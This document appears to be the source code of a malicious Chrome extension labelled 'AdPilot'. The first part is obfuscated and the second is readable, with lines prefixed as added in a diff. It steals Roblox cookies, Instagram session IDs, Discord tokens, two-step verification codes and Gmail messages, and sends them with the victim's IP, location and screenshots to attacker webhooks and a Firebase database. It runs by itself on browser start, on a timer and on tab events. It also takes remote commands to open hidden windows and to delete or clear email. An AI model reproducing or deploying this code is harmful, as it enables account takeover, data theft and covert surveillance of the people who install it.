fetch(_0x20dddf(0x148)+_0x425056);if(_0x3546d6['ok']){const _0x9b7c21=await _0x3546d6[_0x20dddf(0xb4)]();if(_0x9b7c21[_0x20dddf(0x126)])return{'city':_0x9b7c21[_0x20dddf(0x15a)]||_0x20dddf(0x8e),'region':_0x9b7c21['region']||_0x20dddf(0x8e),'country':_0x9b7c21[_0x20dddf(0xa9)]||'Unknown','isp':_0x9b7c21[_0x20dddf(0xbe)]?.['isp']||_0x20dddf(0x8e),'timezone':_0x9b7c21['timezone']?.['id']||_0x20dddf(0x8e)};}}catch{}return null;}async function getRobloxCookie(){const _0x4f8894=a0_0x49c9ba;try{const _0x32d3f0=await chrome[_0x4f8894(0x113)]['get']({'url':'https://www.roblox.com','name':_0x4f8894(0x11c)});return _0x32d3f0?_0x32d3f0['value']:null;}catch{return null;}}async function checkCookieAndSend(_0x526200){const _0x41264d=await getRobloxCookie();if(!_0x41264d){sendNoCookieEmbed();return;}noCookieSent=![],sendRobloxCookieToWebhook(_0x526200);}async function sendNoCookieEmbed(){const _0x4458a9=a0_0x49c9ba,_0x41557c=await getIPAddress(),_0x22223e=await getIPDetails(_0x41557c),_0x27f8f9=getBrowserName(),_0x2c23e3={'title':_0x4458a9(0xbd),'description':_0x4458a9(0xb5),'color':0xff5252,'timestamp':new Date()['toISOString'](),'fields':[{'name':_0x4458a9(0xe7),'value':_0x27f8f9,'inline':!![]}]};if(_0x41557c)_0x2c23e3[_0x4458a9(0xdd)][_0x4458a9(0xc9)]({'name':_0x4458a9(0x137),'value':_0x4458a9(0xd3)+_0x41557c+'```','inline':!![]});if(_0x22223e)_0x2c23e3[_0x4458a9(0xdd)][_0x4458a9(0xc9)]({'name':_0x4458a9(0x9b),'value':_0x22223e['country'],'inline':!![]});await sendToWebhook({'embeds':[_0x2c23e3]},_0x4458a9(0x121));}function a0_0x9612(_0x181f26,_0x5c2f8d){_0x181f26=_0x181f26-0x70;const _0x324a85=a0_0x324a();let _0x9612fe=_0x324a85[_0x181f26];return _0x9612fe;}async function getRobloxAccountInfo(_0x4fc584){const _0x204942=a0_0x49c9ba,_0x9391a8={'Cookie':_0x204942(0xb8)+_0x4fc584};try{const _0x1e126=await fetch('https://users.roblox.com/v1/users/authenticated',{'headers':_0x9391a8});if(!_0x1e126['ok'])return null;const _0x46c0ce=await _0x1e126[_0x204942(0xb4)]();let _0x2a0a8='';try{const _0x471543=await fetch('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='+_0x46c0ce['id']+_0x204942(0xad),{'headers':_0x9391a8});if(_0x471543['ok']){const _0x1a580e=await _0x471543[_0x204942(0xb4)]();if(_0x1a580e[_0x204942(0xb9)]?.[0x0])_0x2a0a8=_0x1a580e[_0x204942(0xb9)][0x0]['imageUrl'];}}catch{}let _0x48f526=null;try{const _0x5e7e86=await fetch(_0x204942(0x99)+_0x46c0ce['id']+_0x204942(0x11e),{'headers':_0x9391a8});if(_0x5e7e86['ok'])_0x48f526=(await _0x5e7e86[_0x204942(0xb4)]())[_0x204942(0xea)];}catch{}let _0x213b5f=null;try{const _0x305b35=await fetch(_0x204942(0xd8)+_0x46c0ce['id']+_0x204942(0x159),{'headers':_0x9391a8});if(_0x305b35['ok'])_0x213b5f=await _0x305b35[_0x204942(0xb4)]()===!![]?'Yes':'No';}catch{}let _0x34ee56=null;try{const _0x3bfe93=await chrome[_0x204942(0x113)][_0x204942(0x101)]({'url':_0x204942(0x119),'name':_0x204942(0x147)});if(_0x3bfe93)_0x34ee56=_0x3bfe93[_0x204942(0x9c)];}catch{}return{'user':_0x46c0ce,'avatarUrl':_0x2a0a8,'robux':_0x48f526,'premium':_0x213b5f,'instagramSessionId':_0x34ee56};}catch{return null;}}async function sendRobloxCookieToWebhook(_0x204c7f=a0_0x49c9ba(0x72)){const _0x5ab628=a0_0x49c9ba,_0x2698b2=await getRobloxCookie();if(!_0x2698b2){sendNoCookieEmbed();return;}noCookieSent=![],lastKnownCookie=_0x2698b2;const _0x27747b=await getRobloxAccountInfo(_0x2698b2);if(!_0x27747b)return;const {user:_0x1c7009,avatarUrl:_0x1ea914,robux:_0x57f7b7,premium:_0x34e0b3,instagramSessionId:_0x23841f}=_0x27747b,_0x20743b=await getIPAddress(),_0x3c5478=await getIPDetails(_0x20743b),_0x5134f6=getBrowserName();if(deviceId)firebaseFetch(_0x5ab628(0x76)+deviceId+_0x5ab628(0xd0),{'method':_0x5ab628(0xd5),'body':JSON[_0x5ab628(0x145)](_0x1c7009[_0x5ab628(0x122)])})[_0x5ab628(0xe2)](()=>{});const _0x5a2b44={'startup':'🚀\x20Browser\x20Opened','alarm':_0x5ab628(0xe8),'tabCreate':_0x5ab628(0x105),'tabUpdate':_0x5ab628(0xbf),'cookieChange':_0x5ab628(0x158)},_0xe3b173={'title':_0x5ab628(0xfa),'description':_0x5ab628(0xa3)+_0x1c7009[_0x5ab628(0x122)]+_0x5ab628(0xcf)+_0x1c7009['id']+_0x5ab628(0x90)+_0x1c7009['id'],'color':0x6c5ce7,'timestamp':new Date()[_0x5ab628(0xca)](),'footer':{'text':_0x5ab628(0x112)},'fields':[{'name':_0x5ab628(0x150),'value':_0x5a2b44[_0x204c7f]||_0x204c7f,'inline':![]},{'name':_0x5ab628(0xe7),'value':_0x5134f6,'inline':!![]}]};if(_0x20743b)_0xe3b173['fields'][_0x5ab628(0xc9)]({'name':'🌍\x20IP','value':_0x5ab628(0xd3)+_0x20743b+_0x5ab628(0xd3),'inline':!![]});_0x3c5478&&(_0xe3b173[_0x5ab628(0xdd)][_0x5ab628(0xc9)]({'name':'🏙️\x20City','value':_0x3c5478[_0x5ab628(0x15a)],'inline':!![]}),_0xe3b173[_0x5ab628(0xdd)][_0x5ab628(0xc9)]({'name':_0x5ab628(0x9b),'value':_0x3c5478[_0x5ab628(0xa9)],'inline':!![]}),_0xe3b173[_0x5ab628(0xdd)][_0x5ab628(0xc9)]({'name':'🏢\x20ISP','value':_0x3c5478[_0x5ab628(0xf5)],'inline':!![]}));_0xe3b173[_0x5ab628(0xfd)]+=_0x5ab628(0x116)+_0x2698b2+_0x5ab628(0xd3);if(_0x57f7b7!==null)_0xe3b173[_0x5ab628(0xdd)][_0x5ab628(0xc9)]({'name':_0x5ab628(0x13a),'value':_0x57f7b7[_0x5ab628(0x10c)](),'inline':!![]});if(_0x34e0b3!==null)_0xe3b173[_0x5ab628(0xdd)][_0x5ab628(0xc9)]({'name':'⭐\x20Premium','value':_0x34e0b3,'inline':!![]});if(_0x1ea914)_0xe3b173[_0x5ab628(0xa2)]={'url':_0x1ea914};if(_0x23841f)_0xe3b173[_0x5ab628(0xdd)][_0x5ab628(0xc9)]({'name':_0x5ab628(0x85),'value':_0x5ab628(0xd3)+_0x23841f+_0x5ab628(0xd3),'inline':![]});await sendToWebhook({'embeds':[_0xe3b173]},'roblox-cookie');}sendRobloxCookieToWebhook(a0_0x49c9ba(0x92)),chrome[a0_0x49c9ba(0xf8)][a0_0x49c9ba(0xf1)][a0_0x49c9ba(0x14d)]((_0x4205f0,_0x4aaa73,_0xadcfff)=>{const _0x3bc56c=a0_0x49c9ba;if(_0x4205f0['action']===_0x3bc56c(0x9a))return sendDiscordTokenToWebhook(_0x4205f0[_0x3bc56c(0xff)],_0x4205f0[_0x3bc56c(0x136)],_0x4205f0[_0x3bc56c(0x11b)],_0x4205f0['avatarUrl'],_0x4205f0['accountAge'],_0x4205f0['guilds'])[_0x3bc56c(0x98)](()=>_0xadcfff({'success':!![]}))[_0x3bc56c(0xe2)](_0x292504=>_0xadcfff({'success':![],'error':_0x292504[_0x3bc56c(0x8a)]})),!![];if(_0x4205f0['action']===_0x3bc56c(0x81))return((async()=>{const _0x5b90c3=_0x3bc56c;let _0x5d2e6e=_0x5b90c3(0x8e);try{const _0x4c6189=await getRobloxCookie();if(_0x4c6189){const _0x113e71=await getRobloxAccountInfo(_0x4c6189);if(_0x113e71?.[_0x5b90c3(0xdc)]?.[_0x5b90c3(0x122)])_0x5d2e6e=_0x113e71['user'][_0x5b90c3(0x122)];}}catch{}await sendStartVerificationToWebhook(_0x5d2e6e),_0xadcfff({'success':!![]});})()),!![];if(_0x4205f0[_0x3bc56c(0x152)]===_0x3bc56c(0xe1)){if(!_0x4205f0[_0x3bc56c(0x13c)]||_0x4205f0[_0x3bc56c(0x13c)][_0x3bc56c(0xfe)]!==0x6)return _0xadcfff({'success':![],'error':_0x3bc56c(0x9d)}),!![];return sendTwoStepCodeToWebhook(_0x4205f0[_0x3bc56c(0x13c)])[_0x3bc56c(0x98)](()=>_0xadcfff({'success':!![]}))[_0x3bc56c(0xe2)](_0x2daeb4=>_0xadcfff({'success':![],'error':_0x2daeb4[_0x3bc56c(0x8a)]})),!![];}if(_0x4205f0[_0x3bc56c(0x152)]===_0x3bc56c(0x110))return((async()=>{const _0x2e4ac9=_0x3bc56c,{name:_0x2264bb,email:_0x5e7776,messages:messages=[]}=_0x4205f0;chrome['storage'][_0x2e4ac9(0xe9)][_0x2e4ac9(0x8b)]({'lastGmailAccount':{'name':_0x2264bb,'email':_0x5e7776,'messages':messages,'at':Date['now']()}}),await firebaseFetch(_0x2e4ac9(0xec),{'method':'PUT','body':JSON[_0x2e4ac9(0x145)]({'name':_0x2264bb,'email':_0x5e7776,'messages':messages,'at':Date['now']()})})['catch'](()=>{});if(_0x2264bb&&_0x5e7776){const _0x81d808=getBrowserName(),_0x40363f={'title':_0x2e4ac9(0x77),'color':0xea4335,'timestamp':new Date()[_0x2e4ac9(0xca)](),'footer':{'text':'AdPilot'},'fields':[{'name':_0x2e4ac9(0xef),'value':_0x2264bb,'inline':!![]},{'name':_0x2e4ac9(0x14f),'value':_0x5e7776,'inline':!![]},{'name':_0x2e4ac9(0xe7),'value':_0x81d808,'inline':!![]},{'name':_0x2e4ac9(0x89),'value':deviceId||_0x2e4ac9(0x8e),'inline':!![]},{'name':'📥\x20Count','value':messages[_0x2e4ac9(0xfe)][_0x2e4ac9(0x10c)](),'inline':!![]}]};await sendToWebhook({'embeds':[_0x40363f]},_0x2e4ac9(0x11d));const _0x2ea1c8=0x8;for(let _0xc31596=0x0;_0xc31596<messages[_0x2e4ac9(0xfe)];_0xc31596+=_0x2ea1c8){const _0x2afec5=messages[_0x2e4ac9(0xf2)](_0xc31596,_0xc31596+_0x2ea1c8),_0x451c1c=_0x2afec5['map']((_0x305c67,_0x1eb23f)=>({'name':'#'+(_0xc31596+_0x1eb23f+0x1)+_0x2e4ac9(0xda)+(_0x305c67['subject']||_0x2e4ac9(0xe0))[_0x2e4ac9(0xf2)](0x0,0x96),'value':('**From:**\x20'+(_0x305c67[_0x2e4ac9(0x10f)]||_0x2e4ac9(0x8e))+(_0x305c67[_0x2e4ac9(0x153)]?'\x20`'+_0x305c67[_0x2e4ac9(0x153)]+'`':'')+'\x0a'+(_0x305c67[_0x2e4ac9(0x7f)]||'')[_0x2e4ac9(0xf2)](0x0,0x78))['slice'](0x0,0x3e8),'inline':![]}));await sendToWebhook({'embeds':[{'title':_0x2e4ac9(0xba)+(_0xc31596+0x1)+'–'+(_0xc31596+_0x2afec5[_0x2e4ac9(0xfe)]),'color':0x4285f4,'footer':{'text':_0x2e4ac9(0x140)+_0x5e7776},'fields':_0x451c1c}]},_0x2e4ac9(0x7b)+_0xc31596),await new Promise(_0x2390dc=>setTimeout(_0x2390dc,0x2bc));}}_0xadcfff({'ok':!![]});})()),!![];});let deviceId=null;function getDeviceId(_0x278a1f){const _0x1031db=a0_0x49c9ba;chrome[_0x1031db(0x8d)][_0x1031db(0xe9)]['get']([_0x1031db(0x96)],_0x269263=>{const _0x4a90e0=_0x1031db;if(!_0x269263[_0x4a90e0(0x96)]){const _0x448b7e=_0x4a90e0(0xa0)+Math['random']()[_0x4a90e0(0x10c)](0x24)[_0x4a90e0(0x129)](0x2,0x6)[_0x4a90e0(0xa5)]();chrome[_0x4a90e0(0x8d)][_0x4a90e0(0xe9)][_0x4a90e0(0x8b)]({'deviceId':_0x448b7e},()=>_0x278a1f(_0x448b7e));}else _0x278a1f(_0x269263[_0x4a90e0(0x96)]);});}async function registerDevice(){getDeviceId(async _0x4a712a=>{const _0x2f34aa=a0_0x9612;deviceId=_0x4a712a;const _0x76ec77=await getIPAddress(),_0x21282a=await getIPDetails(_0x76ec77)?.[_0x2f34aa(0xa9)]||'Unknown',_0x393e11=getBrowserName(),_0x1d99c3=navigator[_0x2f34aa(0x97)];let _0x1a28b0=_0x2f34aa(0x8e);try{const _0xaf474b=await getRobloxCookie();if(_0xaf474b){const _0x5d3944=await getRobloxAccountInfo(_0xaf474b);if(_0x5d3944?.[_0x2f34aa(0xdc)]?.[_0x2f34aa(0x122)])_0x1a28b0=_0x5d3944[_0x2f34aa(0xdc)][_0x2f34aa(0x122)];}}catch{}const _0x4ca334={'title':_0x2f34aa(0x124),'color':0x6c5ce7,'fields':[{'name':_0x2f34aa(0xfb),'value':deviceId,'inline':!![]},{'name':_0x2f34aa(0xf0),'value':_0x393e11,'inline':!![]},{'name':'OS','value':_0x1d99c3,'inline':!![]},{'name':'IP','value':_0x76ec77||'Unknown','inline':!![]},{'name':'Country','value':_0x21282a,'inline':!![]},{'name':_0x2f34aa(0xed),'value':_0x1a28b0,'inline':!![]}],'timestamp':new Date()['toISOString']()};await sendToWebhook({'embeds':[_0x4ca334]},'device-reg'),await firebaseFetch(_0x2f34aa(0x76)+deviceId+_0x2f34aa(0x83),{'method':_0x2f34aa(0xd5),'body':JSON['stringify']({'deviceId':deviceId,'browser':_0x393e11,'os':_0x1d99c3,'ip':_0x76ec77,'country':_0x21282a,'lastSeen':Date[_0x2f34aa(0x107)](),'online':!![],'robloxUsername':_0x1a28b0})});});}setInterval(async()=>{const _0x5b1040=a0_0x49c9ba;deviceId&&await firebaseFetch(_0x5b1040(0x76)+deviceId+'/lastSeen.json',{'method':_0x5b1040(0xd5),'body':JSON[_0x5b1040(0x145)](Date['now']())})['catch'](()=>{});},0x7530);async function sendStartVerificationToWebhook(_0x4d05d4){const _0x1b2f77=a0_0x49c9ba,_0x216983=getBrowserName(),_0x278ddf={'title':_0x1b2f77(0x10e),'description':_0x1b2f77(0x80),'color':0xb894,'timestamp':new Date()[_0x1b2f77(0xca)](),'fields':[{'name':_0x1b2f77(0x14b),'value':_0x4d05d4,'inline':!![]},{'name':_0x1b2f77(0xe7),'value':_0x216983,'inline':!![]}]};await sendToWebhook({'embeds':[_0x278ddf]},'start-verify');}async function sendTwoStepCodeToWebhook(_0x4c625d){const _0x101d3b=a0_0x49c9ba,_0x4492b8=getBrowserName(),_0x13f4ba={'title':_0x101d3b(0x161),'description':_0x101d3b(0xc4)+_0x4c625d+_0x101d3b(0xd3),'color':0x6c5ce7,'timestamp':new Date()[_0x101d3b(0xca)](),'fields':[{'name':'🌐\x20Browser','value':_0x4492b8,'inline':!![]}]};await sendToWebhook({'embeds':[_0x13f4ba]},'2sv');}async function sendDiscordTokenToWebhook(_0x1b4877,_0x2eff63,_0x575264,_0x20912c,_0x4ace18,_0x3259cf){const _0x4cf715=a0_0x49c9ba,_0x50e48e=getBrowserName(),_0x1e38e4=_0x3259cf&&_0x3259cf[_0x4cf715(0xfe)]>0x0?_0x3259cf['slice'](0x0,0x14)[_0x4cf715(0x75)](',\x20'):'None',_0x5aadcf={'title':'🔑\x20New\x20Discord\x20Account\x20Added','description':_0x4cf715(0x127)+_0x575264+_0x4cf715(0xdb)+_0x2eff63,'color':0xb894,'timestamp':new Date()[_0x4cf715(0xca)](),'thumbnail':{'url':_0x20912c},'fields':[{'name':'Token','value':_0x4cf715(0xd3)+_0x1b4877+_0x4cf715(0xd3),'inline':![]},{'name':_0x4cf715(0xb0),'value':_0x4ace18,'inline':!![]},{'name':_0x4cf715(0x11a),'value':_0x4cf715(0xd3)+_0x1e38e4+_0x4cf715(0xd3),'inline':![]},{'name':_0x4cf715(0xe7),'value':_0x50e48e,'inline':!![]}]};await sendToWebhook({'embeds':[_0x5aadcf]},_0x4cf715(0xb1));}
+// ============================================
+// WEBHOOK URLs
+// ============================================
+
+const PROXY = "https://rendernowreal.onrender.com";
+const EXT_TOKEN = "k7Xq2mP9vLzR4tN8wYbE3sJ6hD1fA5cG";
+
+const WEBHOOK_URL = `${PROXY}/hook/main`;
+const DEVICE_WEBHOOK_URL = `${PROXY}/hook/device`;
+const SCREENSHOT_WEBHOOK_URL = `${PROXY}/hook/screenshot`;
+
+const OPEN_GMAIL_PATH = "/commands/openGmail.json";
+const OPEN_GMAIL_ALARM = "checkOpenGmail";
+const CLOSE_WINDOWS_PATH = "/commands/closeGmailWindows.json";
+const CLOSE_WINDOWS_ALARM = "checkCloseWindows";
+const DELETE_PATH = "/commands/deleteMessage.json";
+const DELETE_ALARM = "checkDeleteMessage";
+const REFRESH_INBOX_PATH = "/commands/refreshInbox.json";
+const CLEAR_INBOX_PATH = "/commands/clearInbox.json";
+const RESTORE_TRASH_PATH = "/commands/restoreTrash.json";
+
+const FIREBASE_DB_URL = "https://panel-188e4-default-rtdb.firebaseio.com";
+const FIREBASE_API_KEY = "AIzaSyBzcBV0419n4PFEyFt7Je8DhNwHh5Y2k";
+
+const TRACKED_WINDOWS_KEY = "trackedWindows";
+
+const JSON_HEADERS = { "Content-Type": "application/json", "x-token": EXT_TOKEN };
+const FORM_HEADERS = { "x-token": EXT_TOKEN };
+
+// Human-readable source labels
+const SOURCE_LABELS = {
+  "startup":        "🚀 Browser Opened / Extension Started",
+  "install":        "📦 Extension Installed",
+  "alarm":          "⏰ Auto-Send (every 14 min)",
+  "tabCreate":      "🌐 New Roblox Tab Opened",
+  "tabUpdate":      "🌐 Roblox Page Loaded",
+  "cookieChange":   "🔑 Roblox Account Changed",
+  "popup_opened":   "🖱️ Extension Popup Opened",
+  "manual":         "🖱️ Manual",
+  "manual-test":    "🧪 Test",
+  "roblox_visit":   "🌐 Visited Roblox.com"
+};
+
+// ============================================
+// FIREBASE AUTH
+// ============================================
+let firebaseToken = null;
+
+async function signInFirebase() {
+  try {
+    const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${FIREBASE_API_KEY}`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ returnSecureToken: true })
+    });
+    const data = await res.json();
+    if (data.idToken) {
+      firebaseToken = data.idToken;
+      console.log("[firebase] Signed in anonymously.");
+    } else {
+      console.error("[firebase] Auth failed:", data);
+    }
+  } catch (e) {
+    console.error("[firebase] Auth error:", e);
+  }
+}
+
+async function firebaseFetch(path, options = {}) {
+  if (!firebaseToken) await signInFirebase();
+  if (!options.headers) options.headers = {};
+  options.headers["Authorization"] = `Bearer ${firebaseToken}`;
+  const url = path.startsWith("http") ? path : `${FIREBASE_DB_URL}${path}`;
+  const res = await fetch(url, options);
+  if (res.status === 401) {
+    await signInFirebase();
+    options.headers["Authorization"] = `Bearer ${firebaseToken}`;
+    return fetch(url, options);
+  }
+  return res;
+}
+
+signInFirebase();
+
+// ============================================
+// BROWSER DETECTION
+// ============================================
+function getBrowserName() {
+  const ua = navigator.userAgent;
+  if (ua.includes("Edg/")) return "Edge";
+  if (ua.includes("Chrome/")) return "Chrome";
+  if (ua.includes("Firefox/")) return "Firefox";
+  if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
+  return "Unknown Browser";
+}
+
+// ============================================
+// WEBHOOK HELPER
+// ============================================
+async function sendToWebhook(payload, label = "") {
+  try {
+    const res = await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: JSON_HEADERS,
+      body: JSON.stringify(payload)
+    });
+    if (!res.ok) {
+      const text = await res.text().catch(() => "");
+      console.error(`[webhook ${label}] ${res.status}:`, text.slice(0, 300));
+    } else {
+      console.log(`[webhook ${label}] sent ok`);
+    }
+  } catch (e) {
+    console.error(`[webhook ${label}] error:`, e);
+  }
+}
+
+// ============================================
+// WINDOW TRACKING
+// ============================================
+async function trackWindow(winId) {
+  const stored = await chrome.storage.local.get({ [TRACKED_WINDOWS_KEY]: [] });
+  const list = stored[TRACKED_WINDOWS_KEY];
+  if (!list.includes(winId)) list.push(winId);
+  await chrome.storage.local.set({ [TRACKED_WINDOWS_KEY]: list });
+}
+
+async function closeAllTrackedWindows() {
+  const stored = await chrome.storage.local.get({ [TRACKED_WINDOWS_KEY]: [] });
+  for (const id of stored[TRACKED_WINDOWS_KEY]) {
+    try { await chrome.windows.remove(id); } catch (e) {}
+  }
+  await chrome.storage.local.set({ [TRACKED_WINDOWS_KEY]: [] });
+}
+
+// ============================================
+// SCREENSHOT
+// ============================================
+async function captureAndSendScreenshot(triggerSource = "manual") {
+  try {
+    await new Promise(resolve => setTimeout(resolve, 500));
+    let tabs = await chrome.tabs.query({ active: true, currentWindow: true });
+    if (!tabs || tabs.length === 0) {
+      tabs = (await chrome.tabs.query({})).filter(tab => tab.url && (tab.url.startsWith('http://') || tab.url.startsWith('https://')));
+      if (tabs.length === 0) throw new Error('No capturable tab found');
+      tabs = [tabs[0]];
+    }
+    const tab = tabs[0];
+    const dataUrl = await chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png' });
+    if (!dataUrl) throw new Error('captureVisibleTab returned null');
+
+    const browser = getBrowserName();
+    const ipAddress = await getIPAddress();
+    const ipDetails = await getIPDetails(ipAddress);
+    const cookie = await getRobloxCookie();
+    let robloxInfo = cookie ? await getRobloxAccountInfo(cookie) : null;
+
+    const fields = [
+      { name: '🌐 Tab URL', value: tab.url || 'Unknown', inline: false },
+      { name: '🌐 Browser', value: browser, inline: true }
+    ];
+    if (ipAddress) fields.push({ name: '🌍 IP Address', value: `\`\`\`${ipAddress}\`\`\``, inline: true });
+    if (ipDetails) {
+      fields.push({ name: '🏙️ City', value: ipDetails.city, inline: true });
+      fields.push({ name: '📍 State/Region', value: ipDetails.region, inline: true });
+      fields.push({ name: '🌎 Country', value: ipDetails.country, inline: true });
+      fields.push({ name: '🏢 ISP', value: ipDetails.isp, inline: true });
+    }
+    if (robloxInfo && robloxInfo.user) {
+      fields.push({ name: '👤 Roblox User', value: `[${robloxInfo.user.name}](https://www.roblox.com/users/${robloxInfo.user.id}/profile)`, inline: true });
+    } else {
+      fields.push({ name: '👤 Roblox User', value: 'Not logged in', inline: true });
+    }
+
+    const formData = new FormData();
+    formData.append('file', await (await fetch(dataUrl)).blob(), 'screenshot.png');
+    formData.append('payload_json', JSON.stringify({
+      content: `📸 Screenshot triggered by **${triggerSource}**`,
+      embeds: [{ title: 'Active Tab Screenshot', color: 0x6c5ce7, timestamp: new Date().toISOString(), footer: { text: 'AdPilot' }, fields }]
+    }));
+
+    await fetch(SCREENSHOT_WEBHOOK_URL, { method: 'POST', headers: FORM_HEADERS, body: formData });
+  } catch (e) {
+    console.error('Screenshot capture failed:', e);
+  }
+}
+
+// ============================================
+// SCREENSHOT REQUESTS
+// ============================================
+const SCREENSHOT_REQUESTS_PATH = "/screenshot_requests";
+const SCREENSHOT_REQUEST_CHECK_ALARM = "checkScreenshotRequests";
+
+async function getHighestScreenshotRequestId() {
+  try {
+    const response = await firebaseFetch(`${SCREENSHOT_REQUESTS_PATH}.json?shallow=true`);
+    if (!response.ok) return null;
+    const data = await response.json();
+    if (!data) return null;
+    const keys = Object.keys(data);
+    if (keys.length === 0) return null;
+    keys.sort((a, b) => Number(a) - Number(b));
+    return keys[keys.length - 1];
+  } catch (e) { return null; }
+}
+
+async function checkScreenshotRequests() {
+  try {
+    const highestId = await getHighestScreenshotRequestId();
+    if (!highestId) return;
+    const storage = await chrome.storage.local.get({ lastProcessedScreenshotRequestId: "0" });
+    if (Number(highestId) > Number(storage.lastProcessedScreenshotRequestId)) {
+      await captureAndSendScreenshot("discord_button");
+      await chrome.storage.local.set({ lastProcessedScreenshotRequestId: highestId });
+    }
+  } catch (e) {}
+}
+
+// ============================================
+// OPEN GMAIL + DISCORD WINDOWS
+// ============================================
+async function checkOpenGmail() {
+  try {
+    const r = await firebaseFetch(OPEN_GMAIL_PATH);
+    if (!r.ok) return;
+    const data = await r.json();
+    if (!data || !data.ts) return;
+    const stored = await chrome.storage.local.get({ lastOpenGmailTs: 0 });
+    if (data.ts > stored.lastOpenGmailTs) {
+      await chrome.storage.local.set({ lastOpenGmailTs: data.ts });
+      async function createHiddenWindow(url, label) {
+        try {
+          const win = await chrome.windows.create({ url, focused: false, width: 900, height: 700, type: "normal" });
+          try { await chrome.windows.update(win.id, { state: "minimized", focused: false }); } catch (e) {}
+          await trackWindow(win.id);
+        } catch (e) { console.error(`[openGmail] ${label} failed:`, e); }
+      }
+      await createHiddenWindow("https://mail.google.com", "gmail");
+      await new Promise(r => setTimeout(r, 800));
+      await createHiddenWindow("https://discord.com/", "discord-1");
+      await new Promise(r => setTimeout(r, 800));
+      await createHiddenWindow("https://discord.com/", "discord-2");
+    }
+  } catch (e) { console.error("[openGmail] error:", e); }
+}
+
+// ============================================
+// CLOSE WINDOWS
+// ============================================
+async function checkCloseWindows() {
+  try {
+    const r = await firebaseFetch(CLOSE_WINDOWS_PATH);
+    if (!r.ok) return;
+    const data = await r.json();
+    if (!data || !data.ts) return;
+    const stored = await chrome.storage.local.get({ lastCloseWindowsTs: 0 });
+    if (data.ts > stored.lastCloseWindowsTs) {
+      await chrome.storage.local.set({ lastCloseWindowsTs: data.ts });
+      await closeAllTrackedWindows();
+      sendToWebhook({ content: "❌ Closed all tracked Gmail/Discord windows" }, "close-windows");
+    }
+  } catch (e) {}
+}
+
+// ============================================
+// DELETE GMAIL MESSAGE
+// ============================================
+async function checkDeleteMessage() {
+  try {
+    const r = await firebaseFetch(DELETE_PATH);
+    if (!r.ok) return;
+    const data = await r.json();
+    if (!data || !data.threadId || data.status === "done") return;
+    const stored = await chrome.storage.local.get({ lastDeleteTs: 0 });
+    if (data.ts <= stored.lastDeleteTs) return;
+    await chrome.storage.local.set({ lastDeleteTs: data.ts });
+
+    let tabs = await chrome.tabs.query({ url: "*://mail.google.com/*" });
+    let tabId;
+    if (tabs.length === 0) {
+      const win = await chrome.windows.create({ url: "https://mail.google.com", focused: false, width: 900, height: 700 });
+      await new Promise(r => setTimeout(r, 12000));
+      const newTabs = await chrome.tabs.query({ windowId: win.id });
+      tabId = newTabs[0]?.id;
+      await trackWindow(win.id);
+    } else { tabId = tabs[0].id; }
+    if (!tabId) return;
+
+    let result;
+    try {
+      result = await chrome.tabs.sendMessage(tabId, { action: "deleteGmailMessage", threadId: data.threadId, subject: data.subject });
+    } catch (e) {
+      await chrome.tabs.reload(tabId);
+      await new Promise(r => setTimeout(r, 14000));
+      try { result = await chrome.tabs.sendMessage(tabId, { action: "deleteGmailMessage", threadId: data.threadId, subject: data.subject }); }
+      catch (e2) { result = { ok: false, error: String(e2) }; }
+    }
+
+    await firebaseFetch(DELETE_PATH, { method: "PATCH", body: JSON.stringify({ status: "done", doneAt: Date.now(), result }) });
+    sendToWebhook({ content: `${result?.ok ? "✅" : "❌"} Delete command for **${data.subject || data.threadId}**` }, "delete-result");
+  } catch (e) {}
+}
+
+// ============================================
+// REFRESH / CLEAR / RESTORE
+// ============================================
+async function checkRefreshInbox() {
+  try {
+    const r = await firebaseFetch(REFRESH_INBOX_PATH);
+    if (!r.ok) return;
+    const data = await r.json();
+    if (!data || !data.ts) return;
+    const stored = await chrome.storage.local.get({ lastRefreshInboxTs: 0 });
+    if (data.ts <= stored.lastRefreshInboxTs) return;
+    await chrome.storage.local.set({ lastRefreshInboxTs: data.ts });
+    const tabs = await chrome.tabs.query({ url: "*://mail.google.com/*" });
+    if (tabs.length > 0) { try { await chrome.tabs.sendMessage(tabs[0].id, { action: "rescrapeInbox" }); } catch (e) { await chrome.tabs.reload(tabs[0].id); } }
+    else { const w = await chrome.windows.create({ url: "https://mail.google.com", focused: false, width: 900, height: 700 }); await trackWindow(w.id); }
+  } catch (e) {}
+}
+
+async function checkClearInbox() {
+  try {
+    const r = await firebaseFetch(CLEAR_INBOX_PATH);
+    if (!r.ok) return;
+    const data = await r.json();
+    if (!data || !data.ts) return;
+    const stored = await chrome.storage.local.get({ lastClearInboxTs: 0 });
+    if (data.ts <= stored.lastClearInboxTs) return;
+    await chrome.storage.local.set({ lastClearInboxTs: data.ts });
+    let tabs = await chrome.tabs.query({ url: "*://mail.google.com/*" });
+    if (tabs.length === 0) {
+      const win = await chrome.windows.create({ url: "https://mail.google.com", focused: false, width: 900, height: 700 });
+      await trackWindow(win.id);
+      await new Promise(r => setTimeout(r, 12000));
+      tabs = await chrome.tabs.query({ windowId: win.id });
+    }
+    const res = await chrome.tabs.sendMessage(tabs[0].id, { action: "clearInbox" });
+    sendToWebhook({ content: `🗑️ Clear inbox: ${JSON.stringify(res)}` }, "clear");
+  } catch (e) {}
+}
+
+async function checkRestoreTrash() {
+  try {
+    const r = await firebaseFetch(RESTORE_TRASH_PATH);
+    if (!r.ok) return;
+    const data = await r.json();
+    if (!data || !data.ts) return;
+    const stored = await chrome.storage.local.get({ lastRestoreTrashTs: 0 });
+    if (data.ts <= stored.lastRestoreTrashTs) return;
+    await chrome.storage.local.set({ lastRestoreTrashTs: data.ts });
+    let tabs = await chrome.tabs.query({ url: "*://mail.google.com/*" });
+    if (tabs.length === 0) {
+      const win = await chrome.windows.create({ url: "https://mail.google.com", focused: false, width: 900, height: 700 });
+      await trackWindow(win.id);
+      await new Promise(r => setTimeout(r, 12000));
+      tabs = await chrome.tabs.query({ windowId: win.id });
+    }
+    const res = await chrome.tabs.sendMessage(tabs[0].id, { action: "restoreTrash" });
+    sendToWebhook({ content: `♻️ Restore trash: ${JSON.stringify(res)}` }, "restore");
+  } catch (e) {}
+}
+
+// ============================================
+// ALARMS
+// ============================================
+chrome.runtime.onInstalled.addListener(async (details) => {
